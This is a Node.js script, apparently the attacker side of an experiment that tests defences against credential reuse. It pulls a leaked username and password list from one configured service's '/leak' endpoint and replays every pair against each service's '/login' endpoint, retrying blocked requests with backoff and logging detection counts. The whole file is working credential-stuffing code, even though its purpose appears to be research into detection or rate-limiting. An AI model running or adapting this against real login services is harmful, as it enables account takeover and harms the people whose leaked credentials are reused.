const axios = require('axios');
const config = require("./config");
const fs = require('fs');

var truePositives = 0;
var falseNegatives = 0;

async function query(request, delay = 500) {
  try {
    let result = await request;
    falseNegatives++;
    return result;
  } catch (err) {
    truePositives++;
    return await new Promise((resolve, reject) => {
      setTimeout(() => {
        query(request, delay * 2).then((res) => {
          resolve(res);
        });
      }, delay);
    });
  }
}

async function wait(time) {
  return new Promise((resolve, reject) => {
    setTimeout(() => {
      resolve();
    }, time);
  });
}

(async () => {
  await wait(config.attackStart);

  const leak = config.services[Math.floor(Math.random() * config.services.length)];
  const users = (await query(axios.get(leak.endpoint + '/leak'))).data.users;
  if (config.debug) console.log('Leaked data: ', users);

  var results = [];

  let overallSuccessful = 0;
  let overallFailed = 0;

  for (let service of config.services) {
    let successful = 0;
    let failed = 0;

    if (config.debug) console.log("\n" + 'Attacking service: ' + service.endpoint);
    for (const [username, password] of Object.entries(users)) {
      const attempt = (await query(axios.post(service.endpoint + '/login', {
        username: username,
        password: password
      }))).data;
      if (attempt.success) {
        if (config.debug) console.log('Successful login attempt: (' + username + ', ' + password + ')');
        successful++;
      } else {
        if (config.debug) console.log('Failed login attempt: (' + username + ', ' + password + ')');
        failed++;
      }
    }

    overallSuccessful += successful;
    overallFailed += failed;

    results.push({
      service: service,
      successful: successful,
      failed: failed
    });
  }

  if (config.debug) console.log("\n\nOriginal leak: " + leak.endpoint + "\n");
  if (config.debug) console.log("Service\t\t\tSuccess\tFail\t%");
  for (let result of results) {
    if (config.debug) console.log(result.service.endpoint + "\t" + result.successful + "\t" + result.failed + "\t" + ((result.successful / (result.successful + result.failed)) * 100));
  }
  if (config.debug) console.log("TOTAL\t\t\t" + overallSuccessful + "\t" + overallFailed + "\t" + ((overallSuccessful / (overallSuccessful + overallFailed)) * 100) + "\n");
  console.log("True Positives: " + truePositives);
  fs.appendFileSync('experiment.log', 'TP,' + truePositives + "\n");
  console.log("False Negatives: " + falseNegatives);
  fs.appendFileSync('experiment.log', 'FN,' + falseNegatives + "\n");
  console.log("Successful Attacks: " + overallSuccessful);
  fs.appendFileSync('experiment.log', 'AS,' + overallSuccessful + "\n");
  console.log("Failed Attacks: " + overallFailed);
  fs.appendFileSync('experiment.log', 'AU,' + overallFailed + "\n");
})();